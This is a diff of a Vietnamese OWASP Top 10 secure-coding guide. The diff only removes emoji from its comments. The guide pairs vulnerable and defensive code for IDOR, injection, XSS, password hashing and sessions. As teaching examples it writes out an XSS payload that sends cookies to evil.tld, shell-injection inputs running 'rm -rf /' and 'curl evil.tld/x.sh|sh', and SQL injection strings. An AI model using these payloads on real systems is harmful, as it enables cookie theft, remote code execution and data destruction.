@@ -4,7 +4,7 @@ OWASP Top 10 (bản 2021) là danh sách 10 nhóm rủi ro web phổ biến và 
 
 Mỗi mục theo cùng một khuôn: **kẻ tấn công làm gì → code dễ vỡ → code phòng thủ → checklist**. Hãy đọc với tư duy "nếu tôi là người chịu trách nhiệm, tôi review PR này có cho merge không".
 
-> 💡 Nguyên tắc: Bảo mật không phải là một feature bạn "thêm vào cuối" — nó là cách bạn viết từng dòng truy vấn, từng route, từng hàm so sánh mật khẩu. Defense in depth: giả định mọi tầng phía ngoài đã thất bại.
+> Nguyên tắc: Bảo mật không phải là một feature bạn "thêm vào cuối" — nó là cách bạn viết từng dòng truy vấn, từng route, từng hàm so sánh mật khẩu. Defense in depth: giả định mọi tầng phía ngoài đã thất bại.
 
 ---
 
@@ -17,7 +17,7 @@ Mỗi mục theo cùng một khuôn: **kẻ tấn công làm gì → code dễ v
 **Kẻ tấn công làm gì:** Người dùng hợp lệ `alice` gọi `GET /api/invoices/1001` và thấy hóa đơn của mình. Cô ta thử đổi sang `GET /api/invoices/1002` — và xem được hóa đơn của người khác, vì server chỉ kiểm tra "đã đăng nhập" chứ không kiểm tra "hóa đơn này có phải của bạn không".
 
 ```js
-// ⚠️ Code dễ vỡ — chỉ check đăng nhập, không check ownership
+// Code dễ vỡ — chỉ check đăng nhập, không check ownership
 app.get("/api/invoices/:id", requireAuth, async (req, res) => {
   const invoice = await db.invoice.findById(req.params.id);
   res.json(invoice); // ai đăng nhập cũng xem được MỌI invoice
@@ -25,7 +25,7 @@ app.get("/api/invoices/:id", requireAuth, async (req, res) => {
 ```
 
 ```js
-// ✅ Code phòng thủ — ràng buộc theo chủ sở hữu trong chính câu truy vấn
+// ✓ Code phòng thủ — ràng buộc theo chủ sở hữu trong chính câu truy vấn
 app.get("/api/invoices/:id", requireAuth, async (req, res) => {
   const invoice = await db.invoice.findOne({
     id: req.params.id,
@@ -38,14 +38,14 @@ app.get("/api/invoices/:id", requireAuth, async (req, res) => {
 
 Điểm mấu chốt: **luôn lọc theo chủ thể (subject) lấy từ session/token phía server**, không bao giờ tin `ownerId` do client gửi. Dùng ID khó đoán (UUID) chỉ là "security through obscurity" — không thay thế được kiểm tra quyền.
 
-> ⚠️ Lỗ hổng: Mass assignment là họ hàng của IDOR. Nếu bạn làm `db.user.update(req.body)`, kẻ tấn công thêm `"role":"admin"` vào body để tự nâng quyền. Luôn whitelist field được phép cập nhật.
+> Lỗ hổng: Mass assignment là họ hàng của IDOR. Nếu bạn làm `db.user.update(req.body)`, kẻ tấn công thêm `"role":"admin"` vào body để tự nâng quyền. Luôn whitelist field được phép cập nhật.
 
 ### Missing Function-Level Access Control
 
 **Kẻ tấn công làm gì:** Trang `/admin/users` được ẩn khỏi menu của user thường, nhưng endpoint API `POST /api/admin/users/:id/ban` không hề kiểm tra vai trò. Một user thường đoán ra URL (hoặc đọc JS bundle) và gọi thẳng API để ban người khác.
 
 ```python
-# ⚠️ Code dễ vỡ — ẩn nút trên UI nhưng API không kiểm tra role
+# Code dễ vỡ — ẩn nút trên UI nhưng API không kiểm tra role
 @app.post("/api/admin/users/<uid>/ban")
 @require_auth
 def ban_user(uid):
@@ -54,7 +54,7 @@ def ban_user(uid):
 ```
 
 ```python
-# ✅ Code phòng thủ — kiểm tra quyền ở tầng server, deny-by-default
+# ✓ Code phòng thủ — kiểm tra quyền ở tầng server, deny-by-default
 def require_role(role):
     def deco(fn):
         @wraps(fn)
@@ -73,7 +73,7 @@ def ban_user(uid):
     return {"ok": True}
 ```
 
-> 💡 Nguyên tắc: **Deny by default**. Access control phải nằm ở **server-side**, áp dụng tập trung (middleware/decorator/policy) chứ không rải rác. UI chỉ là gợi ý trải nghiệm — đừng bao giờ coi việc "ẩn nút" là cơ chế bảo mật.
+> Nguyên tắc: **Deny by default**. Access control phải nằm ở **server-side**, áp dụng tập trung (middleware/decorator/policy) chứ không rải rác. UI chỉ là gợi ý trải nghiệm — đừng bao giờ coi việc "ẩn nút" là cơ chế bảo mật.
 
 **Checklist A01:**
 - Mọi truy vấn đọc/ghi resource đều lọc theo chủ thể từ session, không từ input.
@@ -92,13 +92,13 @@ Nhóm này (trước 2021 gọi là "Sensitive Data Exposure") nói về việc 
 **Kẻ tấn công làm gì:** Database bị lộ (qua SQLi, backup rò rỉ...). Nếu mật khẩu lưu plaintext hoặc hash bằng MD5/SHA-1 không salt, kẻ tấn công dùng rainbow table / GPU brute-force để khôi phục hàng triệu mật khẩu trong vài giờ, rồi credential stuffing sang dịch vụ khác.
 
 ```js
-// ⚠️ Code dễ vỡ
+// Code dễ vỡ
 const hash = crypto.createHash("sha256").update(password).digest("hex");
 // SHA-256 nhanh → GPU thử hàng tỉ lần/giây. Không salt → rainbow table.
 ```
 
 ```js
-// ✅ Code phòng thủ — dùng hàm hash chậm, có salt, chuyên cho mật khẩu
+// ✓ Code phòng thủ — dùng hàm hash chậm, có salt, chuyên cho mật khẩu
 import argon2 from "argon2";
 
 // Đăng ký: argon2id tự sinh salt ngẫu nhiên, nhúng tham số vào chuỗi kết quả
@@ -119,12 +119,12 @@ Lựa chọn 2025: **Argon2id** (ưu tiên), hoặc **scrypt**, **bcrypt** (cost
 | Toàn vẹn / chữ ký | HMAC, chữ ký số | Không | Token, webhook |
 | Biểu diễn dữ liệu | Encoding (Base64) | Có (ai cũng đảo) | **KHÔNG phải bảo mật** |
 
-> ⚠️ Lỗ hổng: Base64 **không phải** mã hóa — `atob()` đảo ngược tức thì. Đừng bao giờ "bảo mật" thông tin bằng cách Base64 nó. Tương tự, JWT mặc định chỉ **ký** (integrity) chứ không **mã hóa** payload — đừng nhét secret vào JWT claim rồi tưởng nó kín.
+> Lỗ hổng: Base64 **không phải** mã hóa — `atob()` đảo ngược tức thì. Đừng bao giờ "bảo mật" thông tin bằng cách Base64 nó. Tương tự, JWT mặc định chỉ **ký** (integrity) chứ không **mã hóa** payload — đừng nhét secret vào JWT claim rồi tưởng nó kín.
 
 ### Dữ liệu khi truyền và khi nghỉ
 
 ```nginx
-# ✅ Bắt buộc HTTPS + HSTS để chống downgrade/sslstrip
+# ✓ Bắt buộc HTTPS + HSTS để chống downgrade/sslstrip
 server {
   listen 443 ssl;
   add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
@@ -151,7 +151,7 @@ Injection xảy ra khi **dữ liệu do người dùng kiểm soát bị diễn 
 **Kẻ tấn công làm gì:** Form đăng nhập nối thẳng input vào câu SQL. Kẻ tấn công nhập username `admin' --` hoặc `' OR '1'='1` để bỏ qua điều kiện, đăng nhập không cần mật khẩu, thậm chí dump cả bảng users.
 
 ```python
-# ⚠️ Code dễ vỡ — nối chuỗi
+# Code dễ vỡ — nối chuỗi
 q = f"SELECT * FROM users WHERE name = '{name}' AND pass = '{pw}'"
 # input name = "admin' --"  → câu SQL biến thành:
 # SELECT * FROM users WHERE name = 'admin' -- ' AND pass = '...'
@@ -159,7 +159,7 @@ db.execute(q)
 ```
 
 ```python
-# ✅ Code phòng thủ — parameterized query (prepared statement)
+# ✓ Code phòng thủ — parameterized query (prepared statement)
 db.execute(
     "SELECT * FROM users WHERE name = %s AND pass = %s",
     (name, pw),  # driver gửi data tách biệt khỏi câu lệnh -> không thể "thoát" ra code
@@ -219,7 +219,7 @@ db.execute(
 
 Quy tắc: **luôn parameterize**. Nếu phải truyền tên bảng/cột động (không parameterize được), hãy **whitelist** giá trị cho phép, không nối thẳng. ORM giúp nhiều nhưng `raw()` / string interpolation trong ORM vẫn vỡ như thường.
 
-> 💡 Nguyên tắc: Đừng "lọc ký tự xấu" (blacklist `'`, `;`...) để chống SQLi — luôn có cách bypass (encoding, ký tự Unicode tương đương). Parameterize là cách đúng và duy nhất đáng tin.
+> Nguyên tắc: Đừng "lọc ký tự xấu" (blacklist `'`, `;`...) để chống SQLi — luôn có cách bypass (encoding, ký tự Unicode tương đương). Parameterize là cách đúng và duy nhất đáng tin.
 
 ### Cross-Site Scripting (XSS)
 
@@ -294,26 +294,26 @@ XSS là injection vào **trình duyệt**: kẻ tấn công nhét JavaScript ch�
 **Kẻ tấn công làm gì (stored):** Đăng một comment `<script>fetch('https://evil.tld/c?'+document.cookie)</script>`. Mỗi người xem trang comment đều bị gửi cookie sang server kẻ tấn công.
 
 ```js
-// ⚠️ Code dễ vỡ — nhét input thẳng vào HTML
+// Code dễ vỡ — nhét input thẳng vào HTML
 element.innerHTML = "Xin chào " + userInput;          // reflected/stored XSS
 node.innerHTML = location.hash.slice(1);              // DOM XSS
 ```
 
 ```jsx
-// ✅ Phòng thủ 1 — output encoding theo ngữ cảnh
+// ✓ Phòng thủ 1 — output encoding theo ngữ cảnh
 element.textContent = "Xin chào " + userInput;        // textContent KHÔNG parse HTML
 // React/Vue/Angular tự escape khi render {userInput}; chỉ vỡ nếu bạn cố tình:
-<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ⚠️ tránh, hoặc sanitize trước
+<div dangerouslySetInnerHTML={{ __html: userInput }} /> // tránh, hoặc sanitize trước
 ```
 
 ```js
-// ✅ Phòng thủ 2 — nếu BUỘC phải render HTML do người dùng nhập, sanitize allowlist
+// ✓ Phòng thủ 2 — nếu BUỘC phải render HTML do người dùng nhập, sanitize allowlist
 import DOMPurify from "dompurify";
 node.innerHTML = DOMPurify.sanitize(userHtml);
 ```
 
 ```http
-# ✅ Phòng thủ 3 (defense in depth) — Content Security Policy chặn inline script
+# ✓ Phòng thủ 3 (defense in depth) — Content Security Policy chặn inline script
 Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
 ```
 
@@ -324,20 +324,20 @@ Cộng thêm: cookie session đặt `HttpOnly` để JS không đọc được �
 **Kẻ tấn công làm gì:** Một endpoint "ping host" nối input vào lệnh shell. Kẻ tấn công nhập `8.8.8.8; rm -rf / --no-preserve-root` hoặc `$(curl evil.tld/x.sh|sh)` để chạy lệnh tùy ý trên server (RCE).
 
 ```js
-// ⚠️ Code dễ vỡ — gọi shell với chuỗi nối
+// Code dễ vỡ — gọi shell với chuỗi nối
 const { exec } = require("child_process");
 exec(`ping -c1 ${host}`);   // host = "8.8.8.8; rm -rf /" -> thực thi cả hai lệnh
 ```
 
 ```js
-// ✅ Code phòng thủ — KHÔNG qua shell, truyền argv tách biệt + validate
+// ✓ Code phòng thủ — KHÔNG qua shell, truyền argv tách biệt + validate
 const { execFile } = require("child_process");
 
 if (!/^[a-zA-Z0-9.\-]+$/.test(host)) throw new Error("invalid host"); // allowlist
 execFile("ping", ["-c1", host]);  // không có shell -> ';', '|', '$()' chỉ là chuỗi thường
 ```
 
-> 💡 Nguyên tắc cho cả A03: **Tách data khỏi code.** SQLi → parameterized query. XSS → output encoding + CSP. Command injection → truyền argv array, không gọi shell. Cùng một tư duy: dữ liệu người dùng không bao giờ được "biến thành" lệnh.
+> Nguyên tắc cho cả A03: **Tách data khỏi code.** SQLi → parameterized query. XSS → output encoding + CSP. Command injection → truyền argv array, không gọi shell. Cùng một tư duy: dữ liệu người dùng không bao giờ được "biến thành" lệnh.
 
 **Checklist A03:**
 - 100% truy vấn DB dùng parameterized query; không string interpolation.
@@ -357,7 +357,7 @@ Nhóm này (trước 2021 là "Broken Authentication") gom các lỗi liên quan
 **Kẻ tấn công làm gì:** Lấy danh sách email/password rò rỉ từ vụ khác, tự động thử hàng triệu lần lên endpoint login của bạn. Nếu không rate-limit, không khóa, không MFA → một tỷ lệ tài khoản sẽ bị chiếm.
 
 ```python
-# ✅ Phòng thủ — rate-limit theo IP + theo tài khoản, generic error, thời gian phản hồi đồng đều
+# ✓ Phòng thủ — rate-limit theo IP + theo tài khoản, generic error, thời gian phản hồi đồng đều
 @app.post("/login")
 @limiter.limit("5/minute")          # chặn brute-force theo IP
 def login():
@@ -386,7 +386,7 @@ Mật khẩu đơn lẻ không còn đủ. Thứ tự ưu tiên độ mạnh:
 **Passkey** dùng cặp khóa public/private; private key nằm trong thiết bị/secure enclave, ký challenge gắn với domain → trang phishing có domain khác sẽ không lấy được chữ ký hợp lệ. Đây là hướng khuyến nghị thay thế cả password.
 
 ```js
-// ✅ Đăng ký passkey (WebAuthn) — phía server cấp challenge, RP ID = domain thật
+// ✓ Đăng ký passkey (WebAuthn) — phía server cấp challenge, RP ID = domain thật
 const options = await generateRegistrationOptions({
   rpID: "app.example.com",          // ràng buộc origin -> chống phishing
   userID, userName,
@@ -399,7 +399,7 @@ const options = await generateRegistrationOptions({
 ### Quản lý Session
 
 ```js
-// ✅ Phòng thủ phiên đăng nhập
+// ✓ Phòng thủ phiên đăng nhập
 res.cookie("sid", sessionId, {
   httpOnly: true,    // JS không đọc được -> giảm tác hại XSS
   secure: true,      // chỉ gửi qua HTTPS
@@ -411,7 +411,7 @@ req.session.regenerate(() => { /* gán user */ });
 // Logout/đổi mật khẩu -> hủy session phía server, không chỉ xóa cookie.
 ```
 
-> ⚠️ Lỗ hổng: Không **rotate session ID** sau đăng nhập → session fixation: kẻ tấn công đặt sẵn session ID cho nạn nhân, đợi họ đăng nhập rồi dùng chính ID đó. Luôn `regenerate` khi nâng quyền (login).
+> Lỗ hổng: Không **rotate session ID** sau đăng nhập → session fixation: kẻ tấn công đặt sẵn session ID cho nạn nhân, đợi họ đăng nhập rồi dùng chính ID đó. Luôn `regenerate` khi nâng quyền (login).
 
 **Checklist A07:**
 - Rate-limit + lockout theo IP và theo account; CAPTCHA khi bất thường.
@@ -432,4 +432,4 @@ Các nguyên tắc trên ánh xạ trực tiếp sang dịch vụ AWS khi bạn 
 - **A07 Auth Failures → Cognito:** **Amazon Cognito** lo authentication, MFA (TOTP/SMS), passkey/WebAuthn, account lockout, password policy, hosted UI OAuth/OIDC — đỡ phải tự viết login dễ sai. Bảo vệ login bằng **WAF rate-based rule** chống brute-force/credential stuffing.
 - **Phát hiện & ứng phó:** **GuardDuty** phát hiện hành vi bất thường (login lạ, credential bị lạm dụng, gọi API khả nghi); **CloudTrail** ghi lại mọi API call để điều tra; **Security Hub** tổng hợp phát hiện theo chuẩn (CIS, AWS FSBP) — đây là phần "monitoring & response" của defense in depth.
 
-> 💡 Nguyên tắc tổng kết: AWS cho bạn nhiều "lớp lưới" (WAF, GuardDuty, KMS, Cognito), nhưng **không lớp nào thay được code an toàn**. Hãy viết đúng từ trong app trước, rồi xếp các dịch vụ AWS làm defense in depth phía ngoài.
+> Nguyên tắc tổng kết: AWS cho bạn nhiều "lớp lưới" (WAF, GuardDuty, KMS, Cognito), nhưng **không lớp nào thay được code an toàn**. Hãy viết đúng từ trong app trước, rồi xếp các dịch vụ AWS làm defense in depth phía ngoài.
